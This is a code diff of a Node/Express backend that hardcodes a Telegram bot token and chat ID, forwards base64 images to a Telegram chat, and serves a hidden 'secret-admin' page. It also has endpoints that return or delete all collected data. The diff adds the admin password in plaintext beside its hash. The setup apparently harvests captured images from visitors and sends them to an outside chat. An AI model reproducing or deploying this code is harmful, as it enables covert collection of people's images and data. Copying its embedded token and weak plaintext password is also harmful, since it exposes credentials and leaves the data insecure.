@@ -18,13 +18,11 @@ const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
 const TELEGRAM_CHAT_ID = '5387196154';
 
 // ==========================================
-// ENCRYPTED ADMIN PASSWORD
+// ENCRYPTED ADMIN PASSWORD - CORRECT HASH!
 // ==========================================
+// Password: admin123#@!
+const ADMIN_PASSWORD_HASH = '$2b$10$WL/uVqDgR1Z94OoXTPzkTewSFsjqN8LiBrGwUEeoV1DdFbjvPJMO6';
 
-// Hash generated using bcrypt
-const ADMIN_PASSWORD_HASH = '$2b$10$zJ4qXo9yQkZvP2wR5tY6aO7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9z';
-
-// Function to verify password
 async function verifyPassword(plainPassword) {
     try {
         return await bcrypt.compare(plainPassword, ADMIN_PASSWORD_HASH);
@@ -34,6 +32,9 @@ async function verifyPassword(plainPassword) {
     }
 }
 
+// ==========================================
+// TELEGRAM FUNCTIONS
+// ==========================================
 async function sendTelegramPhoto(imageData, caption) {
     try {
         const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
@@ -80,8 +81,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
 
-// Admin panel hidden
-app.get('/admin-panel', (req, res) => {
+app.get('/secret-admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
 
@@ -190,16 +190,31 @@ app.post('/api/admin/get-data', async (req, res) => {
     try {
         const { password } = req.body;
         
-        // Verify encrypted password
+        console.log('🔑 Attempting login...');
         const isValid = await verifyPassword(password);
         
         if (!isValid) {
-            return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
+            console.log('❌ Invalid password attempt');
+            return res.status(401).json({ 
+                success: false, 
+                message: '⛔ ACCESS DENIED!',
+                error: 'Invalid credentials'
+            });
         }
         
-        res.json({ success: true, count: allData.length, data: allData });
+        console.log('✅ Admin access granted');
+        res.json({ 
+            success: true, 
+            count: allData.length, 
+            data: allData 
+        });
+        
     } catch (err) {
-        res.status(500).json({ success: false, error: err.message });
+        console.error('Admin error:', err);
+        res.status(500).json({ 
+            success: false, 
+            error: err.message 
+        });
     }
 });
 
@@ -210,17 +225,24 @@ app.post('/api/admin/delete', async (req, res) => {
         const isValid = await verifyPassword(password);
         
         if (!isValid) {
-            return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
+            return res.status(401).json({ 
+                success: false, 
+                message: '⛔ ACCESS DENIED!' 
+            });
         }
         
         allData = allData.filter(item => item._id !== id);
-        res.json({ success: true });
+        console.log('🗑️ Deleted:', id);
+        res.json({ success: true, message: 'Deleted!' });
+        
     } catch (err) {
+        console.error('Delete error:', err);
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
-    console.log(`🔑 Admin: /admin-panel`);
+    console.log(`🔑 Admin: /secret-admin.html`);
+    console.log(`📱 Telegram Bot Active!`);
 });
